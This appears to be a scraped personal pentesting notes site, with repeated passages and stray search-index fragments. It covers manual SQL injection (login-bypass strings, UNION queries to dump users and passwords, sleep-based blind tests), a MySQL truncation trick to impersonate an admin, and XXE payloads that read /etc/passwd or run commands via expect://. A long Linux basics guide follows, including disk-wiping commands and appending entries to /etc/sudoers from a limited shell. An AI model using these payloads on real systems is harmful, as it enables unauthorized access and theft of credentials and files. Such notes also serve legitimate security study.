Which means that what the users puts in in the login-form will be executed my mysql. So just like in xss-injections we just try to escape the input field to be able to execute sql-commands. So if we input the following into the user-field and password-field in the login: whatever' or '1'='1 whatever' or '1'='1 The query will look like this: $query = \"SELECT * FROM users WHERE username = 'whatever' OR '1'='1' AND password='whatever' OR '1'='1'\"; Since they both become true the database will retrieve all users and we will be able to bypass the login.

And it can generate a lot of traffic. And also it is good to understand the vulnerability in the cote and not just run tools. So let's learn sql-injections the manual way. The two main ways for perform a sql-injection: error based or blind . Error-bases DB enumeration # If we manage to find an error-message after a broken sql-query, we can use that to try to map out the database structure. For example, if we have a url that end with http://example.com/photoalbum.php?id=1 Step 1 - Add the tick ' # So first we should try to break the sql-syntaxt by adding a ' . We should first ad a ' or a \" . http://example.com/photoalbum.php?id=1' If the page then returns a blank page or a page with a sql-error we know that the page it vulnerable. Step 2 - Enumerate columns # So in order to enumerate the columns of a table we can use the order by Order by 1 means sort by values of the first column from the result set. Order by 2 means sort by values of the second column from the result set. So it is basically just a tool to order the data in a table. But we can use it to find out how many columns a table has. Because if we do order by 10 when there really only is 9 columns sql will throw an error. And we will know how many columns the table has. # This trhows no error http://example.com/photoalbum.php?id=1 order by 9 # This throws error http://example.com/photoalbum.php?id=1 order by 10 So you just increase the number (or do a binary tree search if you want tot do it a bit faster) until you get an error, and you know how many columns the table has. Step 3 - Find space to output db # Now we need to know which coolumns are being outputed on the webpage. It could be that not all data from the database is worthwhile to output, so maybe only column 1 and 3 are being outputted to the website. To find out which columns are being outputted we can use the union select command. So we do the command like this http://example.com/photoalbum.php?id=1 union select 1,2,3,4,5,6,7,8,9 For all the columns that exists. This will return the numbers of the columns that are being outputted on the website. Take note of which these columns are. Step 4 - Start enumerating the database # Now we can use that field to start outputing data. For example if columns number five has been visible in step 3, we can use that to output the data. Here is a list of data we can retrieve from the database. Some of the syntaxes may difference depending on the database engine (mysql, mssql, postgres). # Get username of the sql-user http://example.com/photoalbum.php?id=1 union select 1,2,3,4,user(),6,7,8,9 # Get version http://example.com/photoalbum.php?id=1 union select 1,2,3,4,version(),6,7,8,9 # Get all tables http://example.com/photoalbum.php?id=1 union select 1,2,3,4,table_name,6,7,8,9 from information_schema.tables # Get all columns from a specific table http://example.com/photoalbum.php?id=1 union select 1,2,3,4,column_name,6,7,8,9 from information_schema.columns where table_name = 'users' # Get content from the users-table. From columns name and password.

This make the whole process a lot more complicated. But it is of course still possible to exploit. Using sleep # Since we do not have access to the logs we do not know if our commands are syntaxically correct or not. To know if it is correct or not we can however use the sleep statement. http://example.com/photoalbum.php?id=1-sleep(4) If it lods for four seconds exta we know that the database is processing our sleep() command. Get shell from sql-injection # The good part about mysql from a hacker-perspective is that you can actaully use slq to write files to the system.

Truncating Mysql Vulerability # Basically this happens when you don't validate the length of user input. Two things are needed for it to work: Mysql does not make comparisons in binary mode. This means that \"admin\" and \"admin \" are the same. If the username column in the database has a character-limit the rest of the characters are truncated, that is removed. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed. With this information we can create a new admin-user and have our own password set to it. So if the max-length is 20 characters we can insert the following string admin removed This means that the \"removed\" part will be removed/truncated/deleted. And the trailing spaces will be removed upon insert in the database. So it will effectively be inserted as \"admin\".

Which means that what the users puts in in the login-form will be executed my mysql. So just like in xss-injections we just try to escape the input field to be able to execute sql-commands. So if we input the following into the user-field and password-field in the login: whatever' or '1'='1 whatever' or '1'='1 The query will look like this: $query = \"SELECT * FROM users WHERE username = 'whatever' OR '1'='1' AND password='whatever' OR '1'='1'\"; Since they both become true the database will retrieve all users and we will be able to bypass the login.

Common with file-uploading functionality. For files that uses XML, like: docx, pptx, gpx, pdf and xml itself. Background XML # XML is a markup language, like HTML. Unlike HTML is does not have any predefined tags. It is the user that create the tags in the XML object. XML is just a format for storing and transporing data. XML uses tags and subtags, just like html. Or parents, children, and syblings. So in that sense it has the same tree-structure as html. To define a XML-section/document you need the following tag to begin: Oh, and by the way TAG is named ELEMENT (same as in html) <?xml version=\"1.0\" encoding=\"UTF-8\"?> <?xml version=\"1.0\" ?> <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> Example of valid XML: <?xml version=\"1.0\"?> <change-log> <text>Hello World</text> </change-log> DTD stand for Document type definition. A DTD is basically a file that defines the structure of an XML document. For example, this is quite common to see baick in the days: This simply means that the XML document will follow the standard defined in the references DTD. This DTD simply defines an old form of HTML. <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML Basic 1.0//EN\" \"http://www.w3.org/TR/xhtml-basic/xhtml-basic10.dtd\"> DTD:s can be really useful in order to create a standard when transferring data. The sender and the reciever knows exactly what tags the document will have. So imagine that you create a service that anyone can use to send in data in the format of XML, but how will they know what elements are required, and so on. https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing Syntax rule # So, now that we know that DTD are just definitions of XML documents, the question becomes, how do we write our own DTD:s. A DTD must adhere to a few rules. Must have root element (it doesn't have to be called root, it can be called anything) Optional have XML prolog (xml version is the prolog) <?xml version=\"1.0\" encoding=\"UTF-8\"?> All elements must have closing tag Tags are case-sensitive XML Attributes must be quotes Special characters must be escaped correctly. < < less than > > greater than & & ampersand ' ' apostrophe \" \" quotation mark Whitespace is perserved in XML Okay, so those are some of the rules. Now let's look at some practical examples, how do we create/define an element in in a DTD? <!ELEMENT element-name category> or <!ELEMENT element-name (element-content)> In attacks you will probably see things like this: <!ENTITY name value> <!ENTITY % name value> The first one create a general entity. The second one (with the percentage sign) creates a \"parameter\" entity. I think the first one is dereferences like this &name; ANd the second one like this: %name; So, now lets combine all this and create a DTD. If the DTD is defined inside an already existing XML document we need the following. THis says: \"here comes a DTD\". <!DOCTYPE note []> Now let's add some elements: <!DOCTYPE note [ <!ELEMENT note (name, age)> //This means that the note element must contain a name and age element. The parenthesis just means that it coantains child elements. <!ELEMENT name (#PCDATA)> // Here we define the name of the element <name></name> and that it will be PCDATA <!ELEMENT age (#PCDATA)> ]> <note> <name>Pelle</name> <age>20</age> </note> Okay. But maybe we don't want to define the entire XML document, inside every request, inside every XML document. It seems a bit like a hassle. So maybe we can just import the DTD? YES, this is possible. The most basic way this can be done is the following way. SYSTEM is just a keyword for \"load external DTD\". <!DOCTYPE root SYSTEM \"myDTD.dtd\"> <!DOCTYPE root SYSTEM \"http://yourdomain.net/myDTD.dtd\"> Which protocols are allowed depends on the implementation of the XML parser. But some that might work are the following: gopher:// file:// http:// https:// file:// ftp:// Okay. So now we know how we can retreieve an external DTD. But what about ENTITY, it is even int eh name of the attack XML EXTERNAL ENTITY. So, when you define your DTD you can basically create variables, in xml-speak a variable is an ENTITY. In a DTD an entitiy is defined like this: <!DOCTYPE root [ <!ENTITY name \"PELLE\"> ]> <root>&name;</root> When the XML is parsed the entity will be transformed into \"PELLE\". Of course, you can also retreive external entities. <!DOCTYPE root [ <!ENTITY name SYSTEM \"file:///etc/passwd\"> ]> <root>&name;</root> <!DOCTYPE root [ < ]> Attack # So if an application receives XML to the server the attacker might be able to exploit an XXE. It could be sent as a GET, but it is more likely that it is send in a POST. An attack might look like this: <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo> The elemet can be whatever, it doesn't matter. The xxe is the \"variable\" where the content of /dev/random get stored. And by dereferencing it in the foo-tag the content gets outputted.This way an attacker might be able to read files from the local system, like boot.ini or passwd. SYSTEM means that what is to be included can be found locally on the filesystem. In php-applications where the expect module is loaded it is possible to get RCE. It is not a very common vulnerability, but still good to know. <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"expect://id\" >]> <creds> <user>&xxe;</user> <pass>mypass</pass> </creds> Even if the data is not reflected backto the website it is still possible to exfiltrate files and data from the server. The technique is similar to how you exfiltrate the cookie in a Cross-Site Scripting attack, you send it in the url.

Unlike HTML is does not have any predefined tags. It is the user that create the tags in the XML object. XML is just a format for storing and transporing data. XML uses tags and subtags, just like html. Or parents, children, and syblings. So in that sense it has the same tree-structure as html. To define a XML-section/document you need the following tag to begin: Oh, and by the way TAG is named ELEMENT (same as in html) <?xml version=\"1.0\" encoding=\"UTF-8\"?> <?xml version=\"1.0\" ?> <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> Example of valid XML: <?xml version=\"1.0\"?> <change-log> <text>Hello World</text> </change-log> DTD stand for Document type definition. A DTD is basically a file that defines the structure of an XML document. For example, this is quite common to see baick in the days: This simply means that the XML document will follow the standard defined in the references DTD. This DTD simply defines an old form of HTML. <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML Basic 1.0//EN\" \"http://www.w3.org/TR/xhtml-basic/xhtml-basic10.dtd\"> DTD:s can be really useful in order to create a standard when transferring data. The sender and the reciever knows exactly what tags the document will have. So imagine that you create a service that anyone can use to send in data in the format of XML, but how will they know what elements are required, and so on. https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing","title":"Background XML"},{"location":"attacking_web_applications/xml_external_entity_attack/#syntax-rule","text":"So, now that we know that DTD are just definitions of XML documents, the question becomes, how do we write our own DTD:s. A DTD must adhere to a few rules. Must have root element (it doesn't have to be called root, it can be called anything) Optional have XML prolog (xml version is the prolog) <?xml version=\"1.0\" encoding=\"UTF-8\"?> All elements must have closing tag Tags are case-sensitive XML Attributes must be quotes Special characters must be escaped correctly. < < less than > > greater than & & ampersand ' ' apostrophe \" \" quotation mark Whitespace is perserved in XML Okay, so those are some of the rules. Now let's look at some practical examples, how do we create/define an element in in a DTD? <!ELEMENT element-name category> or <!ELEMENT element-name (element-content)> In attacks you will probably see things like this: <!ENTITY name value> <!ENTITY % name value> The first one create a general entity. The second one (with the percentage sign) creates a \"parameter\" entity. I think the first one is dereferences like this &name; ANd the second one like this: %name; So, now lets combine all this and create a DTD. If the DTD is defined inside an already existing XML document we need the following. THis says: \"here comes a DTD\". <!DOCTYPE note []> Now let's add some elements: <!DOCTYPE note [ <!ELEMENT note (name, age)> //This means that the note element must contain a name and age element. The parenthesis just means that it coantains child elements. <!ELEMENT name (#PCDATA)> // Here we define the name of the element <name></name> and that it will be PCDATA <!ELEMENT age (#PCDATA)> ]> <note> <name>Pelle</name> <age>20</age> </note> Okay. But maybe we don't want to define the entire XML document, inside every request, inside every XML document. It seems a bit like a hassle. So maybe we can just import the DTD? YES, this is possible. The most basic way this can be done is the following way. SYSTEM is just a keyword for \"load external DTD\". <!DOCTYPE root SYSTEM \"myDTD.dtd\"> <!DOCTYPE root SYSTEM \"http://yourdomain.net/myDTD.dtd\"> Which protocols are allowed depends on the implementation of the XML parser. But some that might work are the following: gopher:// file:// http:// https:// file:// ftp:// Okay. So now we know how we can retreieve an external DTD. But what about ENTITY, it is even int eh name of the attack XML EXTERNAL ENTITY. So, when you define your DTD you can basically create variables, in xml-speak a variable is an ENTITY. In a DTD an entitiy is defined like this: <!DOCTYPE root [ <!ENTITY name \"PELLE\"> ]> <root>&name;</root> When the XML is parsed the entity will be transformed into \"PELLE\". Of course, you can also retreive external entities. <!DOCTYPE root [ <!ENTITY name SYSTEM \"file:///etc/passwd\"> ]> <root>&name;</root> <!DOCTYPE root [ < ]>","title":"Syntax rule"},{"location":"attacking_web_applications/xml_external_entity_attack/#attack","text":"So if an application receives XML to the server the attacker might be able to exploit an XXE. It could be sent as a GET, but it is more likely that it is send in a POST.

The xxe is the \"variable\" where the content of /dev/random get stored. And by dereferencing it in the foo-tag the content gets outputted.This way an attacker might be able to read files from the local system, like boot.ini or passwd. SYSTEM means that what is to be included can be found locally on the filesystem. In php-applications where the expect module is loaded it is possible to get RCE. It is not a very common vulnerability, but still good to know. <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"expect://id\" >]> <creds> <user>&xxe;</user> <pass>mypass</pass> </creds> Even if the data is not reflected backto the website it is still possible to exfiltrate files and data from the server.

I could divide it up in many subchapters but I like to have it all at one place so I can just do ctr-f , and search for whatever I am looking for. 1. The Shell - Bash # The shell, or the terminal is a really useful tool. Bash is the standard shell on most Linux distros. One really useful trick when working with bash is to search for old commands that you have used. You can access this search function by doing ctr-r in the terminal. The configuration file for the bash shell is ~./bashrc Navigating # pwd - Print working directory cd - Change directory cd ~ - Change directory to your home directory cd - - Go back to previous directory Looking at files # ls - List files in directory ls -ltr - Sort list by last modified. -time -reverse file - Show info about file. What type of file it is. If it is a binary or text file for example. cat - Output content of file. less - Output file but just little bit at a time. Use this one. Not more . Use /searchterm to search. It is the same command as in vim. n to scroll to next search result. Press q to quit. more - Output file but just little bit at a time. less is better. Working with files # touch - Create a new file. cp - Copy mkdir - Make directory. # Make entire directory structure mkdir -p new/thisonetoo/and/this/one rm - Remove file # Remove recursively and its content. Very dangerous command! rm -rf ./directory Watch the command destroy an entire machine: https://www.youtube.com/watch?v=D4fzInlyYQo rmdir - Remove empty directory A little bit of everything # history - Show commands history sudo List what rights the sudo user has. sudo -l Sudo config file is usually /etc/sudoers Finding files # There are mainly three ways to find files on Linux: find , locate , and which . Find # Find is slower than locate but a lot more thorough. You can search for files recursively and with regex and a lot of other features. # This will send all permissions denied outputs to dev/null. find / -name file 2>/dev/null # Search incasesensitive, that contains the word file. find / -iname *file* 2>/dev/null Locate # Locate is really fast because it relies on an internal database. So in order to have it updated you need to run: sudo updatedb Then you can easily find stuff like this: locate filename Which # Outputs the path of the binary that you are looking for. It searches through the directories that are defined in your $PATH variable. which bash # Usually outputs: /bin/bash Creating custom bash functions # If you want to create a new command from other commands, and be able to invoke that command from your terminal, there are a few different way of doing that. One way is write a bash-script, and then move that script to one of your folders in your $PATH variable. The other way is to simply write a function in your .bashrc file. You can then invoke that function from anywhere in your terminal. So for example, if you want to ssh into a machine, but you are tired of having to write the whole command, you can just add this function in your .basrhrc file: function connecttossh { ssh user@192.168.1.111 } Then you need to source the file, so that it becomes updated: source ./.bashrc Now you can just write connecttossh and the function will be executed. 2. Editing text # First let's just clear out something about standard streams , or I/O -streams. Standard streams are the streams that are used to interact between the human computer-user and the machine. There are three standard streams: standard input (stdin), standard output (stdout), and standard error (stderr).The stdin stream can be seen as an abstractions of the real keyboard input. So when you issue a command/program that requires input the program does not read straight from the keyboard input, instead it reads from the file STDIN. Stdin # Stdin is the data that gets inputed into the program. An example of a program that requires stdin data is cp . In order for the program to do anything it needs input data. For example cp file1 copy_of_file1 . Here file1 and copy_of_file1 is the stdin. So the default Stdin comes from the STDIN-file that is a text-file representation of the keyboard input. But often times we do not want to input stuff from the keyboard, sometimes we want to input something into a program that comes from another file. That is when we can use redirection symbol: > . So an example could be cat < my_text_file.txt . The data from my_text_file.txt will now be used as input instead of the keyboard input. The file descriptor for stdin is: 0 Stdout # Stdout is the data that get ouputed from the program. For example, when you use the command cat file1 that data/text that gets outputed is the stdout The same with the program ls . Not all programs have stdout. For example when you use mv or cp successfully you get no stdout back from the program. The stdout can be redirected to another file by using these symbols > and >> . So now we can do the following: ls > result_of_ls.txt # now the result will be written to the file result_of_ls.txt ls >> result_of_ls.txt # This will append the data to the bottom of the file result_of_ls.txt Another incredibly useful feature is the pipe feature, reprsented with this symbol | . It will take the stdout and redirect it into another program. Here is an example: ls -la | less This will take the stdout from ls -la and forward/redirect it into the less program. Using the pipe you can now chain different commands. The file descriptor for stdout is: 1 Stderr # Stderr is the stream used for outputting error messages. So if a program fails for whatever reason. For example, if we try to copy a file that does not exist, this will be the stdrr output: cp thisfiledoesnotexist aaaaaaaaaa cp: cannot stat 'thisfiledoesnotexist': No such file or directory This is a common way for stderr to present itself, just straight out into the terminal. But sometimes stderr gets sent to a log file. Stderr is useful because with it we can separate between stdout and stderr . However, to the eye it might be difficult to distinguish what output is stdout and what output is stderr . One easy way to determine is the output is stderr or stdout is to simply redirect it into a file. Because by default you only redirect stdout , and not stderr . cp thisfiledoesnotexist aaaaaaaaaa > result.txt cp: cannot stat 'thisfiledoesnotexist': No such file or directory # If we now look at result.txt we will find that it is empty. Since the error-text we recieved could not be redirected into the textfile, since it is stderr and not stdout. Filters # There are certain programs that are especially useful to use together with pipes. They can also be used as stand-alone programs but you will often see them together with pipes. sort sort test.txt uniq To remove any duplicated lines and output all lines but only once. sort -u test.txt sort test.txt | uniq cat filename | sort -u > newFileName grep head tail tr sed Editing text # sed # Can perform basic editing on streams, that is to say, text. Remove first line of file/stream sed \"1d\" cut # Cut by column This is a useful command to cut in text. Let's say that we have the following text, and we want to cut out the ip-address. 64 bytes from 192.168.0.1: icmp_req=1 ttl=255 time=4.86 ms cut -d\" \" -f4 -d stands for delimiter. and -f for field. tr - Translate # Transform all letter into capital letters tr \"[:lower:]\" \"[:upper:]\" < file1 > file2 Example Remove character # Remove characters cat file.txt | tr -d \".\" # Remove and replace # Remove all dots and replace them with underscore. cat file.txt | tr \".\" \"_\" http://www.thegeekstuff.com/2012/12/linux-tr-command/ awk # So awk is an advanced tool for editing text-files. It is its own programming language to it can become quite complex. Awk iterates over the whole file line by line. This is the basic structure of an awk command awk '/search_pattern/ { action_to_take_on_matches; another_action; }' file_to_parse The search pattern takes regex. You can exclude the search portion or the action portion. This just prints every line of the file. awk '{print}' filename Filtering out specific ip-address: awk '/172.16.40.10.81/' error.log Now we want to print out the fourth column of that file, we can just pipe this to cut, but we can also use awk for it, like this: awk '/172.16.40.10.81/ {print $4}' error.log # Another example awk '{print $2,$5;}' error.txt This prints columns 2 and 5. We can use the -F flag to add a custom delimiter. awk -F ':' '{print $1}' test.txt So if you are manipulating some text you might want to start the output with some info about the columns or something like that. To do that we can use the BEGIN-keyword. awk 'BEGIN {printf \"IP-address \\tPort\\n\"} /nop/ {print $3}' test.txt | head awk 'BEGIN{printf \"IP-address \\tPort\\n\"} /nop/ {print $3} END {printf \"End of the file\\n\"}' test.txt | tail Here we are printing IP-address PORT to the first line of the file. 3. User management # There are two commands to add a user in linux: adduser or useradd. adduser is a perl-script that facilitate the process, and useradd is the native linux binary. To add a user we do: adduser NameOfUser useradd nameOfUser To add user to sudo-group: adduser NameOfUser sudo usermod -aG sudo NameOfUser You might have to reboot for it to take effect. On some machines we might not be able to edit the sudoers file because we don't have an interactive shell, in this case can you can just redirect the text into the file, like this: echo \"username ALL=(ALL) ALL\" >> /etc/sudoers Check which users are in the sudo group: cat /etc/group | grep sudo Switch user in terminal: su NameOfUser Remove/delete user: sudo userdel NameOfUser 4. Permissions # ls -la Shows all the files and directories and their permission settings. drwxrwxrwt 2 root root 4,0K ago 3 17:33 myfile Here we have 10 letters in the beginning. The first one d shows that it is a directory. The next three letters are for read, w for write and x for execute. The first three belong to the owner, the second three to the group, and the last three to all users. https://linuxjourney.com/lesson/file-permissions 5. Processes # To display information regarding the systems processes you can use the ps command. ps -aux -a stands for all -u stands for all processes by all users -x stands for all processes that don't run a tty If you run this command you will probably see a pretty big output. In the column for command you will see what command has been run. Every process has a Process Identification Number ( PID ). Something you will also see in the output. All of theses processes can actually be found in /proc . You just go to /proc/[pid] . In /proc you can find information about the system, and you can actually change the system if you change those files! But more on that later. What I wanted to explain is that if we look at the output from ps we see that some commands are in brackets. Like this: root 10 0.0 0.0 0 0 ? S ene14 0:00 [watchdog/0] root 11 0.0 0.0 0 0 ? S ene14 0:00 [watchdog/1] root 12 0.0 0.0 0 0 ? S ene14 0:00 [migration/1] root 13 0.0 0.0 0 0 ? S ene14 0:00 [ksoftirqd/1] Those are usually kernel processes, and you can safely assume that no user has started them. If you want to monitor processes in real time you can use top or htop . top comes preinstalled on most distros. But htop is really a lot nicer. For htop the F1-10 keys might trigger OS-events. So you can use the shortcuts instead. Shortcut Key Function Key Description h F1 Invoke htop Help S F2 Htop Setup Menu / F3 Search for a Process I F4 Invert Sort Order t F5 Tree View > F6 Sort by a column [ F7 Nice \u2013 (change priority) ] F8 Nice + (change priority) k F9 Kill a Process q F10 Quit htop http://www.thegeekstuff.com/2011/09/linux-htop-examples/ 6. Packages # Something that difference Linux from windows is how it handles installing new software. In windows you usually have to google around and then click on random scary download buttons that might fuck up your computer, or not. It's like a constant lottery where you win by no installing malware. In Linux that is usually not really an issue. That is because distros have their own software repositories from where you can download your software. This is kind of like an app-store except everything is free. The different major branches of teh GNU/Linux OS have their own software repositories. Ubuntu has their own, debian has their own, and so on. Different distros also have their own package-amangers. For example, Debian and ubuntu uses apt , while Redhat uses rpm , and Arch uses pacman . You should strick to your own package-manager, because even though chaning package-manager is possible it will probably just cause you more headache than benefits. Install package # Example of how to install something with apt: sudo apt-get install nmap If you only have a .deb file you do this to install from the terminal: sudo dpkg -i /path/to/deb/file sudo apt-get install -f Remove packages # This can be tricky. First find the package dpkg --list Then you find it in your list. sudo apt-get --purge remove nameOfProgram When you remove some package it might have requires some other dependencies. To remove those you run sudo apt-get autoremove Organizing your $path variable # I am talking about debian/ubuntu here. On other systems I don't know. You can define your path in /etc/environment . If you don't have it you can create it and add the path like this: source /etc/environment && export PATH If you are using zsh (which you should) you have to add it here sudo vim /etc/zsh/zshenv And add this line somewhere: source /etc/environment Adding a path # This is a non-persistent way to add binaries to your path. Might be useful if you have entered a system that has limited binaries in the path. export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin Installing custom packages # If you download a package that is not in the official repository you can put the binary in /opt . That is good place to put your binaries. Now you need to add that path to your path-variable. Remember how we set that in /etc/environment . So now open up that file and add /opt to it, so i looks like this. PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/opt\" I always add custom binaries last. That means that if we have two binaries with the same name the machine will first select the original binary. This way you won't have to fear screwing up, by accidentally creating a new ls binary for example. 7. Cronjobs # There are two ways to configure cronjobs. The first one is by putting scripts in the following folders. /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly The second way is to write the command in the crontab # list cronjobs crontab -l # Edit or create new cronjobs crontab -e 8. Devices/disks/partitions # First some terminology. A drive is a physical storage device, just as a hard disk, solid state drive, or usb. In Linux these drives are represented as special file system objects called \"device\". They are found under /dev .A physical storage unit, a drive, can be divided up in to multiple logical storage units, these are called partitions . So they are just digital divisions of the drive. In linux a device are often named something like sda, sdb, sdc. And the partions of those devices are numbered. So one partion might be called sda1 , and another sda2 . These can then be found under /dev/sda1 and /dev/sda2 . You can view the devices and their partions with the command lsblk Formating disks # If you want to do it the easy way, just open gnome-disks . To format disks we are going to use the program parted . It can be used with its own shell or by running commands. So you can just run parted, and you will enter the parted interface. But here we are going to run the commands instead. # Make sure you know which device you are working with, they can change name between boots lsblk Partition standard First we have to choose a partition standard. The modern and mostly used is gpt, and older is msdos. # This will destroy all the data on the on the disk sudo parted /dev/sda mklabel gpt Create a new partition sudo parted --align optimal /dev/sda mkpart primary ext4 0% 100% This command creates a new partition (mkpart), which is of type primary, that takes up the space between 0-100%. Which means we will only have one partition. Now you can see your new partition with lsblk . Format the partition with a specific filesystem Now that we have a partition we need to add a filesystem to it.There are many different types of filesystems. ext4 is common for linux. While windows uses NTFS, and mac uses HFS Plus. exFAT can be understood by all three OS:s, something that might be useful to USB:s. # For linux sudo mkfs.ext4 /dev/sda1 # Supposedly work on linux, mac and windows. But fails for me on my tests on Mac sudo mkfs.vfat /dev/sda1 # To use UDF (universal disk format) that should also work on all OS # You first need to install apt-get install udftools. Then you do: mkudffs /dev/sda1 Remove partition # if you want to remove partition 1 sudo parted /dev/sda rm 1 Mount it Now you can just mount the parition somewhere on your filesystem # Mount it sudo mkdir /mnt/here sudo mount /dev/sda1 /mnt/here # Unmount it sudo umount /mnt/here List all devices lsblk fdisk -l Encrypt a partition # sudo cryptsetup luksFormat /dev/sda1 Mount an encrypted parition cryptsetup open /dev/sda1 backup Then you mount it: mount /dev/mapper/backup /media/username/back Change encryption passphrase # First find out which device is the encrypted device: lsblk # In type you will see \"crypt\" There are eight slots for passphrases. You can view these slots like this: sudo cryptsetup luksDump /dev/sda3 Add a key: sudo cryptsetup luksAddKey /dev/sda3 Remove a key: sudo cryptsetup luksRemoveKey /dev/sda3 # You are then prompted to input the key/passphrase you want to remove Formatting a USB # In order to format a usb drive we have to do the following. If you have stored sensitive information, or otherwise want to make sure that it is not possible to read removed files from the USB you can overwrite the usb (or any other kind of disk) with zeroes, or just random data. So we can start by doing that, however, first we need to know the device name of the usb. First find out the name of the usb/device. We can to that by looking at the dmesg or tail -f var/log/syslog when we insert the usb. Another way is to run the command lsblk before and after inserting the USB. In my case the usb was called sda, , but for you it might be something else. Make sure you know exactly which device you are working with, otherwise you will completely detroythe wrong device. Then we need to unmount the usb. sudo umount /dev/sda Now we are ready to overwrite it with zeroes. It can be done like this: sudo dd if=/dev/zero of=/dev/sda bs=1k count=2048 status=progress Then we just write a new filesystem to the device: sudo mkfs.ext4 -L \"NameOfVolume\" /dev/sda ext4 works well with linux, vfat and ntfs should work with windows. sudo mkfs.vfat -n \"NameOfVolume\" /dev/sda Create bootable USB # First find out the name of the device. Using dmesg , or lsblk , or something similar. sudo dd bs=4M if=/path/to/input.iso of=/dev/sdX conv=fdatasync status=progress That's it. 9.

So if we plug in some device we need to mount it to the filesystem. That pretty much means that we need to connect it to the filesystem. Mount is like another word for connect. So if you want to connect a CD-rom or USB to your machine. You need to mount it to a specific path on the filesystem. So if you plug in the usb it might be accessible at /dev/usb . But that it not enough for you to be able to browse the usb content. You need to mount it. You do this by writing mount /dev/usb /media/usb Or whereever you want to mount it. So when you click on Eject or Safetly remove you are just unmounting. umount /media/usb Knowing how to mount and unmount might be useful if you want to get access to a remote NFS-directory. You will need to mount it to your filesystem to be able to browse it. It is possible that the disk is not known as /dev/usb . If that is the case you can run sudo fdisk -l And see if you can find your device, and look for the address. Then you mount it like this (or with the correct path) sudo mount /dev/sda1 Mount crypto-volume # cryptsetup open /dev/sda1 backup Then you mount it: mount /dev/mapper/backup /media/username/back Create your of filesystem # In some cases it might be useful to create your own disk. Maybe for attaching to a virtual machine, or maybe to facilitate a backup. It is just a easy nice little container to have. It just requires two easy steps. Create a chunk in memory truncate -s 100MB nameOfFile Attach a filesystem to file mkfs.ext4 ./nameOfFile Mount it to your filesystem sudo mount ./nameOfFile /mnt/blabla 10. Controlling services # Systemctl # Systemctl can be used to enable and disable various services on your linux machine. Start ssh systemctl start ssh systemctl status ssh systemctl stop ssh You can verify that the service is listening for connection by running network status. netstat -apnt Make ssh start upon boot systemctl enable ssh systemctl enable apache2 Init.d # Init.d is just a wrapper around Systemctl. I prefer it. /etc/init.d/cron status /etc/init.d/cron start /etc/init.d/cron stop rcconf # This is a tool to control services more easily, what is running upon boot and so on. 11. Kernel # The Kernel is responsible for talking between the hardware and the software, and to manage the systems resources. The Linux Kernel is a monolithic kernel, unlike the OSX and the Windows kernels which are hybrid. You can find the kernel file in /boot . It might look like something like this vmlinuz-4.4.0-57-generic . In the beginning of time the kernel was simply called linux . But when Virtual Memory was introduced they changed the name to vmlinux to reflect that the kernel could handle virtual memory. When the kernel later became too big it was compressed using zlib , therefore the name was changed to vmlinuz . The Linux Kernel differs from Windows in that it contains drivers by default. So you don't have to go around looking for drivers like you do on windows when you want to install a printer, or something like that. It is really easy to upgrade to the latest Linux kernel, all you have to do tis this: sudo apt-get update && sudo apt-get dist-upgrade # or sudo apt-get update && sudo apt-get upgrade If you are using a distro that is Long Term Supported (LTS). You will not get the latest Kernel version, but you will get the latest Long Term Supported version. 14. Logging # Logs can be viewed here on debian distros /var/log/ 16. Network basics # If you use standard desktop installation for Ubuntu or Debian you get NetworkManager included, which handles your network connections, wire and wireless. NetworkManager is made to be easy to use, and \"just work\". And most of the time it does. But sometimes when you want to configure stuff on your own, for whatever reason, it can be a hassle. So for the rest of this chapter I am just going to assume that you have stopped, removed or disabled NetworkManager. # Stop NetworkManager sudo systemctl stop NetworkManager.service # Start NetworkManager sudo systemctl start NetworkManager.service # Disable it so it won't start at boot sudo systemctl disable NetworkManager #Enable it so it will start at boot sudo systemctl disable NetworkManager Network cards (NIC) are identified by their mac address, hosts by theirip address andapplications by their port number. In a nutshell what you need to know # Things you really need to know are: # Configuration files /etc/network/interfaces /etc/resolve.config # Tools ip ip route dhclient wpa_supplicant iptables netstat dnsmasq Configure Network Interface Cards (NIC) # On debian NIC:s are defined and configured in /etc/network/interfaces . # automatically start eth0 on boot auto eth0 # give the eth0 an ip through dhcp iface eth0 inet dhcp # start up the loopback interface auto lo iface lo inet loopback # A bridge called br1 - can be called whatever. # This bridge has a static ip auto br1 iface br1 inet static address 192.168.2.1 netmask 255.255.255.0 broadcast 192.168.2.255 bridge_ports none Take a interface up and down / start and stop It is recommended to take a interface down before configuring it. # ifup eth0 ifdown eth0 # You can also use ip sudo ip link set dev eth0 down sudo ip link set dev eth0 down # You can also use ifconfig to bring an interface up and down. The difference is that ifconfig # will use the current configuration, and not take into account changes from /etc/network/interfaces. # So use ifup and ifdown! ifconfig eth0 up ifconfig eth0 down Configure an interface with ip or ifconfig If you want to configure an interface only temporarly you can use ip and ifconfig . The changes will not survive a reboot. Ifconfig is old and deprecated on some systems. So use ip instead. But they do basically the same thing. Route # Where packets are send in a network depends on the routing of the routing. Every node that the packet passes in its travel to its destination has a routing table defined, that says where the packet should be directed next. The most simple example is how the traffic of a home network is sent to the router, and then from there forwarded on to somewhere else on the internet. How every host should forward the packets are defined in the linux kernel routing table. You can see the routing table by running this command: route ip route netstat -r I think that the most useful of these commands is route, since it includes the column names of the table. Here is an example of the output: Destination Gateway Genmask Flags Metric Ref Use Iface default 192.168.2.1 0.0.0.0 UG 0 0 0 ens3 192.168.2.0 0.0.0.0 255.255.255.0 U 0 0 0 ens3 So let's image that we don't have any routing rules at all. It is completely 